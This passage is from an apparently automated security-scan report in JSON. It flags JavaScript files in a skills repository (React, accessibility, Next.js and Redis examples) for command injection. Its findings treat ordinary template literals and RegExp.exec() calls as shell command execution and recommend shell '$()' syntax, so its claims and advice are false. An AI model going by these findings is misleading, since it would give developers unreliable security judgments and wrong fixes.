      "issue": "Backtick command execution",
      "evidence": "message: `${matches.length} inline object props detected. Extract to variables or useMemo.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 198,
      "issue": "Backtick command execution",
      "evidence": "message: `${arrayMatches.length} inline array props detected. Extract to variables or useMemo.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 227,
      "issue": "Backtick command execution",
      "evidence": "message: `Component has ${propCount} props but is not memoized. Consider React.memo.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 246,
      "issue": "Backtick command execution",
      "evidence": "message: `${matches.length} inline callbacks detected. Consider useCallback for expensive child components.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 260,
      "issue": "exec() usage",
      "evidence": "while ((match = useMemoPattern.exec(content)) !== null) {",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 280,
      "issue": "exec() usage",
      "evidence": "while ((match = useCallbackPattern.exec(content)) !== null) {",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 312,
      "issue": "Backtick command execution",
      "evidence": "message: `Component uses ${matches.length} contexts. Consider consolidating or using a state library.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 344,
      "issue": "Backtick command execution",
      "evidence": "message: `${expensiveOps} expensive operations detected without useMemo. Consider memoization.`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 409,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Total issues: ${report.summary.total}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 410,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Errors: ${report.summary.error}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 411,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Warnings: ${report.summary.warning}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 412,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Info: ${report.summary.info}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 424,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  ${type}: ${issues.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 441,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`File: ${file}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 453,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Component: ${component}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 457,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`    [${severity}] Line ${issue.line}: ${issue.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 530,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error: Directory ${directory} does not exist`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 535,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error: ${directory} is not a directory`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
      "line_number": 539,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Analyzing React components in ${directory}...`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 124,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('page-load', false, `Failed to load page: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 185,
      "issue": "Backtick command execution",
      "evidence": "`All ${elements.total} interactive elements are focusable`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 191,
      "issue": "Backtick command execution",
      "evidence": "`${elements.nonFocusable.length} of ${elements.total} interactive elements are not focusable`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 196,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('focusable-elements', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 274,
      "issue": "Backtick command execution",
      "evidence": "`Found ${positiveTabIndex.length} elements with positive tabindex (anti-pattern)`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 282,
      "issue": "Backtick command execution",
      "evidence": "`Tab order tested with ${tabOrder.length} focusable elements`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 287,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('tab-order', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 334,
      "issue": "Backtick command execution",
      "evidence": "`All ${indicators.total} focusable elements have visible focus indicators`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 340,
      "issue": "Backtick command execution",
      "evidence": "`${indicators.missingIndicators.length} of ${indicators.total} elements lack visible focus indicators`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 345,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('focus-indicators', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 365,
      "issue": "Backtick command execution",
      "evidence": "const key = `${current.tagName}:${current.id}:${current.className}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 416,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('keyboard-traps', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 453,
      "issue": "Backtick command execution",
      "evidence": "`Skip link found: \"${skipLink.text}\" -> ${skipLink.href}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 458,
      "issue": "Backtick command execution",
      "evidence": "`Skip link found but target doesn't exist: ${skipLink.href}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 467,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('skip-links', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 527,
      "issue": "Backtick command execution",
      "evidence": "`${interactive.length} potential keyboard interaction issues found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 532,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('interactive-elements', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 588,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('modals', true, `${modals.total} modal(s) have proper attributes`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 592,
      "issue": "Backtick command execution",
      "evidence": "`${modals.issues.length} modal accessibility issues found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 597,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('modals', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 631,
      "issue": "Backtick command execution",
      "evidence": "const trigger = document.querySelector(`[aria-controls=\"${menu.id}\"]`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 668,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('menus', true, `${menus.total} menu(s) have proper structure`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 672,
      "issue": "Backtick command execution",
      "evidence": "`${menus.issues.length} menu accessibility issues found`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 677,
      "issue": "Backtick command execution",
      "evidence": "result.addTest('menus', false, `Test failed: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 691,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`URL: ${result.url}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 692,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Timestamp: ${result.timestamp}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 694,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Summary:`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 695,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Total Tests: ${result.tests.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 696,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Passed: ${result.passed}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 697,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Failed: ${result.failed}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 698,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`  Warnings: ${result.warnings}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 710,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`${i + 1}. ${test.name}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 711,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`   Message: ${test.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 713,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 723,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`${i + 1}. ${test.name}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 724,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`   Message: ${test.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 726,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 736,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`${i + 1}. ${test.name}: ${test.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 811,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Testing keyboard navigation: ${url}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 823,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Report written to: ${options.output}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 832,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
      "line_number": 851,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Fatal error: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 88,
      "issue": "Backtick command execution",
      "evidence": "throw new Error(`File not found: ${filePath}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 291,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`NEXT.JS METADATA TEST: ${results.file}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 298,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Metadata Type: ${results.hasStaticMetadata ? 'Static' : ''}${results.hasDynamicMetadata ? 'Dynamic' : ''}${!results.hasStaticMetadata && !results.hasDynamicMetadata ? 'None' : ''}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 299,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Issues:        ${results.issues.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 300,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Warnings:      ${results.warnings.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 301,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`Successes:     ${results.successes.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 309,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`[${issue.severity.toUpperCase()}] ${issue.category}: ${issue.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 319,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`[WARN] ${warning.category}: ${warning.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 329,
      "issue": "Backtick command execution",
      "evidence": "lines.push(`[OK] ${success.category}: ${success.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
      "line_number": 400,
      "issue": "Backtick command execution",
      "evidence": "console.error(`Error: ${error.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 42,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Publisher] Published to ${channel}: ${count} subscribers`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 54,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Received on ${subscribedChannel}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 68,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Subscribed to ${channel}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 79,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Received on ${channel} (pattern: ${pattern})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 92,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Subscribed to pattern ${pattern}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 103,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Unsubscribed from ${channel}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 114,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Subscriber] Unsubscribed from pattern ${pattern}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 162,
      "issue": "Backtick command execution",
      "evidence": "this.channel = `chat:room:${roomId}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 197,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[ChatRoom] ${userId} joined ${this.roomId}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 216,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[ChatRoom] ${userId} left ${this.roomId}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 238,
      "issue": "Backtick command execution",
      "evidence": "const channel = `notifications:user:${userId}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 253,
      "issue": "Backtick command execution",
      "evidence": "const channel = `notifications:user:${userId}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 294,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Handler] Received: ${message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 324,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Handler] Channel: ${channel}, Message: ${JSON.stringify(message)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 355,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Chat] ${message.userId}: ${message.message}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 357,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Chat] ${message.userId} joined the room`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 359,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Chat] ${message.userId} left the room`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 394,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Notification] ${notification.type}:`, notification.data);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 399,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Broadcast] ${notification.type}:`, notification.data);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 447,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Service 1] Received: ${JSON.stringify(message)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 451,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Service 2] Received: ${JSON.stringify(message)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 455,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Service 3] Received: ${JSON.stringify(message)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 463,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Subscribers on ${channel}: ${count}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 496,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Cache] Invalidated: ${key}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 506,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Cache] Size: ${cache.size}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
      "line_number": 514,
